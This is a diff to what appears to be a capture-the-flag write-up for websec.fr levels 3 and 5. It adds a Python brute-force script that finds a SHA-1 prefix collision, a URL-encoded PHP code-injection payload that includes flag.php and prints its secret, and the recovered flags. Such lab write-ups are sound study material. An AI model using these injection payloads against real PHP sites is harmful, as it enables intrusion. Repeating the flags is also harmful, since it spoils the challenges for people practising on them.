@@ -24,6 +24,20 @@ It's using <i>password_hash</i> and <i>password_verify</i>, but the hash string 
 ```
 7c00249d409a91ab84e3f421c193520d9fb3674b
 ```
+```
+import hashlib
+import string
+i = 0;
+while True:
+    hash_object = hashlib.sha1(str(i).encode('utf-8')).hexdigest()
+    if (hash_object.startswith("7c00")):
+        print(i)
+        break
+    i = i + 1
+```
+```
+WEBSEC{Please_Do_not_combine_rAw_hash_functions_mi}
+```
 
 **[Level04](http://websec.fr/level04/)**  
 We can Deserialization by create same class
@@ -73,3 +87,10 @@ WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
 ```
 
 **[Level05](http://websec.fr/level05/)**  
+http://websec.fr/level05/index.php?a=flag.php
+```
+%24%7Binclude_once%09%24_GET%5Ba%5D%7D+%24%7Bflag%7D
+```
+```
+WEBSEC{Writing_a_sp3llcheckEr_in_php_aint_no_fun}
+```
